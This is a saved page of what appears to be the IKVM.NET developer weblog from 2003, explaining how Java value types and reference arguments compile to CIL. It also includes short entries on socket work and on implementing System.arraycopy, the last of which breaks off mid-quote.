    <p>
    </p>
    <p>
        Here is a Java example that uses value types and calls a method with a reference argument: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">import</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> system.DateTime;<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">
            <O:P>&#160;</O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> ValTest
            {<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">static</span> DateTime
            dt;<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">
            <O:P>&#160;</O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">public</span> <span style="COLOR: blue">static</span> <span style="COLOR: blue">void</span> main(String[]
            args) {<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>ValType
            v = <span style="COLOR: blue">new</span> ValType(0);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>v.foo
            = 42;<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>System.out.println(v);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">
            <O:P>&#160;</O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>ValType[]
            av = <span style="COLOR: blue">new</span> ValType[1];<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>av[0]
            = v;<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>ValType.Increment(av);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>System.out.println(av[0]);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">
            <O:P>&#160;</O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>dt
            = DateTime.get_Now();<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>DateTime
            d = <span style="COLOR: blue">new</span> DateTime(0);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>d
            = AddDay(d);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>System.out.println(d);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>System.out.println(dt);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">
            <O:P>&#160;</O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">private</span> <span style="COLOR: blue">static</span> DateTime
            AddDay(DateTime dt) {<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span><span style="COLOR: blue">return</span> dt.AddDays(1);<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<O:P></O:P>
            </span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}</span> 
        </p>
    </div>
    <p>
        How is this code compiled? Whenever a value type is loaded from a field or array,
        instantiated or returned from a method it is boxed. Local variables are references
        to boxed instances of the value type. When a boxed value type instance is assigned
        to a field, stored in an array or passed to a method, it is unboxed. Referenced method
        arguments are exported by <em>NetExp</em> as arrays. 
    </p>
    <p>
        Let's look at a few examples: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0">
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>ValType
            v = <span style="COLOR: blue">new</span> ValType(0);<O:P></O:P>
            </span>
        </p>
    </div>
    <p>
        Is compiled as: 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f7f7b0">
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldc.i4.0<O:P></O:P>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">newobj<span style="mso-spacerun: yes">&#160;&#160;&#160;&#160; </span>instance
            void ValType::.ctor(int32)<O:P></O:P>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">box<span style="mso-spacerun: yes">&#160;&#160;&#160;&#160;&#160;&#160;&#160; </span>ValType<O:P></O:P>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">stloc.0<O:P></O:P>
            </span></b>
        </p>
    </div>
    <p>
    </p>
    <p>
        The local variable <font face="Courier New" size="2">v</font> is of type object and
        contains a reference to the boxed value. 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"> 
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>v.foo
            = 42;</span> 
        </p>
        </span></span>
    </div>
    <p>
        Assigning a field in the boxed value:
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f7f7b0"><b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> 
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><?xml:namespace 
prefix = o ns = "urn:schemas-microsoft-com:office:office" 
/>ldloc.0<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldc.i4.s<span style="mso-spacerun: yes">&#160;&#160; </span>42<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">stloc.1<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">unbox<span style="mso-spacerun: yes">&#160;&#160;&#160;&#160;&#160; </span>ValType<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldloc.1<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">stfld<span style="mso-spacerun: yes">&#160;&#160;&#160;&#160;&#160; </span>int32
            ValType::foo</span></b>
        </p></span></b>
    </div>
    <p>
        After loading the reference to the boxed value, the&#160;constant (42) gets stored
        in a temporary local and then reference gets unboxed, this leaves a managed pointer
        to the interior of the boxed value on the stack and the <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">stfld </span>instruction
        uses this pointer to set the field.
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"> 
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>av[0]
            = v;<O:P></O:P>
            </span></span></span>
        </p></span></span>
    </div>
    <p>
        Setting an array element:
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f7f7b0"><b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> 
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldloc.2<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldc.i4.0<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldloc.0<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">stloc.3<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span lang="NL" style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'; mso-ansi-language: NL">ldelema<span style="mso-spacerun: yes">&#160;&#160;&#160; </span>ValType<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span lang="NL" style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'; mso-ansi-language: NL">ldloc.3<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span lang="NL" style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'; mso-ansi-language: NL">unbox<span style="mso-spacerun: yes">&#160;&#160;&#160;&#160;&#160; </span>ValType<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span lang="NL" style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'; mso-ansi-language: NL">ldobj<span style="mso-spacerun: yes">&#160;&#160;&#160;&#160;&#160; </span>ValType<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span lang="NL" style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'; mso-ansi-language: NL">stobj<span style="mso-spacerun: yes">&#160;&#160;&#160;&#160;&#160; </span>ValType</span></b>
        </p></span></b></span></b>
    </div>
    <p>
        The address of element 0 of the array is loaded, v is unboxed and copied into the
        array.
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"> 
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>ValType.Increment(av);<O:P></O:P>
            </span>
        </p></span></span></span></span></span></span>
    </div>
    <p>
        Calling a method with a reference argument:
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f7f7b0"><b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> 
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldloc.2<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">stloc.s<span style="mso-spacerun: yes">&#160;&#160;&#160; </span>V_4<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldloc.s<span style="mso-spacerun: yes">&#160;&#160;&#160; </span>V_4<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldc.i4.0<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldelema<span style="mso-spacerun: yes">&#160;&#160;&#160; </span>ValType<o:p></o:p>
            </span></b>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt">
            <b style="mso-bidi-font-weight: normal"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">call
            void ValType::Increment(valuetype ValType&amp;)</span></b>
        </p></span></b></span></b></span></b>
    </div>
    <p>
        The Java code passes an array and the byte code to CIL compiler takes the address
        of the first element of the array and passes that to the method. BTW, if the array&#160;is
        of length zero, <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ldelema</span> throws
        a System.IndexOutOfRangeException.
    </p>
    <p>
        <strong>Pros and Cons of this Approach</strong>
    </p>
    <p>
        The advantage of enabling value type of reference arguments are that it is easier
        to leverage .NET framework code from within Java code (targetted at IKVM.NET) and
        it enables me to write more glue code in Java.
    </p>
    <p>
        The downside is the non-intuitive behavior. Compare these two lines:
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"> 
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>v.foo
            = 42;</span></span></span>
        </p>
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"></span>&#160;&#160;&#160;
            av[0].foo = 42</span>;<O:P></O:P>
            </span>
        </p></span></span></span></span></span></span>
    </div>
    <p>
        The first line does what you'd expect, it assigns 42 to the field foo of the boxed
        value type. However, the second line has no effect, because it results in a boxed
        copy being loaded from the array, that boxed copy's field foo is assigned the value
        42, but it is not copied back into the array. This also applies to fields, only local
        variables contain boxed value types and can be manipulated safely.
    </p>
    <p>
        Finally, a small problem with arrays of value types is that the Java compiler will
        happily compile:
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"> 
        <p class="MsoNormal" style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none">
            <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes"><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>Object[]
            array = new ValueType[1];</span></span></span>
        </p></span></span></span></span></span></span>
    </div>
    <p>
        Obviously this isn't legal.
    </p>
    <p>
        I'd like&#160;to get&#160;feedback from people who either like or dislike this new
        functionality. Of course, any ideas for alternative approaches would be most welcome
        too.
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/05/2003 16:03:00 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=82cb6a14-41a9-4b05-b215-812202b71366"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=82cb6a14-41a9-4b05-b215-812202b71366">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 31 March 2003</h2></div>
<div class="newsItems"><a name="ae88a341a-eb90-4f56-8484-1f198f367e55"></a><div class="entry">
	<h3 class="entryTitle">Sockets</h3>
	<div class="entryBody">
		I completed most of the Socket code and fixed a few bugs. Mauve results (with current Classpath CVS code): 172 of 7707 tests failed.
<br />
<br />
I updated to BlogX rev 20 and this means that the RSS will now contain xhtml:body (for the new entries). <a href="http://www.simplegeek.com/PermaLink.aspx/4a202482-239b-40a6-aa38-ae8bc348a4a4">Chris</a> says: "So, if you favorite aggregator isn't showing the full text of my blog, send them a mail and get them to support &lt;xhtml:body&gt;!"
<br />
<br />
I've updated the <a href="http://www.frijters.net/ikvm.zip">source</a> and <a href="http://www.frijters.net/ikvmbin.zip">binaries</a> snapshots

	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/31/2003 17:06:44 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e88a341a-eb90-4f56-8484-1f198f367e55"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e88a341a-eb90-4f56-8484-1f198f367e55">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 19 March 2003</h2></div>
<div class="newsItems"><a name="a6d43cef3-f478-4af7-bd8d-e73d30884d61"></a><div class="entry">
	<h3 class="entryTitle">System.arraycopy</h3>
	<div class="entryBody">
		<P>At first sight, it might seem that <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN> is 
not a very interesting method, but once&nbsp;you&nbsp;dig into it, it turns out 
to&nbsp;be an interesting case study.</P>
<P>.NET has a very similar method <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Array.Copy</SPAN> and one of 
its overloads has the exact same signature as its Java cousin, but throws 
slightly different exceptions and there is a tiny difference in behavior. So an 
initial naïve implementation of <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN> 
would look as follows:</P>
<P><SPAN style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public 
static void </SPAN><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">arraycopy(<SPAN 
style="COLOR: blue">object</SPAN> src, <SPAN style="COLOR: blue">int</SPAN> 
srcStart,<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="mso-spacerun: yes">&nbsp;</SPAN><SPAN 
style="COLOR: blue">object</SPAN> dest, <SPAN style="COLOR: blue">int</SPAN> 
destStart, <SPAN style="COLOR: blue">int</SPAN> length) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="COLOR: blue">try</SPAN> {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>Array.Copy(src, srcStart, dest, destStart, length);<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>} <SPAN 
style="COLOR: blue">catch</SPAN>(ArgumentNullException) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw new</SPAN> 
NullReferenceException();<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; 
</SPAN>} <SPAN style="COLOR: blue">catch</SPAN>(ArgumentException) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw</SPAN> <FONT 
color=#0000ff>new</FONT> 
ArrayIndexOutOfBoundsException();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>} <SPAN 
style="COLOR: blue">catch</SPAN>(ArrayTypeMismatchException) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw</SPAN> <FONT 
color=#0000ff>new</FONT> 
ArrayStoreException();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>} <SPAN 
style="COLOR: blue">catch</SPAN>(InvalidCastException) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw</SPAN> <FONT 
color=#0000ff>new</FONT> 
ArrayStoreException();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>}<BR>}<o:p></O:P></SPAN></P>
<P>This works fairly well, but it has two problems. The first problem is that it 
is too powerful. <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Array.Copy</SPAN> allows 
widening conversions for primitive types. This means, for example, that it is 
possible to copy a byte array to an int array. Java doesn’t allow this. The 
second problem is more subtle, Javadocs for <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN> 
say:</P>
<P><I style="mso-bidi-font-style: normal">“Otherwise, if any actual component of 
the source array from position </I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">srcPos</SPAN></I></CODE><I 
style="mso-bidi-font-style: normal"> through </I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">srcPos</SPAN></I></CODE><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: SimSun; mso-bidi-font-family: SimSun">闩</SPAN></I></CODE><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">1</SPAN></I></CODE><I 
style="mso-bidi-font-style: normal"> cannot be converted to the component type 
of the destination array by assignment conversion, an </I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">ArrayStoreException</SPAN></I></CODE><I 
style="mso-bidi-font-style: normal"> is thrown. In this case, let <B><SPAN 
style="mso-bidi-font-style: italic">k</SPAN></B> be the smallest nonnegative 
integer less than length such that </I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">src[srcPos</SPAN></I></CODE><I>k</I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">]</SPAN></I></CODE><I 
style="mso-bidi-font-style: normal"> cannot be converted to the component type 
of the destination array; when the exception is thrown, source array components 
from positions </I><CODE><I style="mso-bidi-font-style: normal"><SPAN 
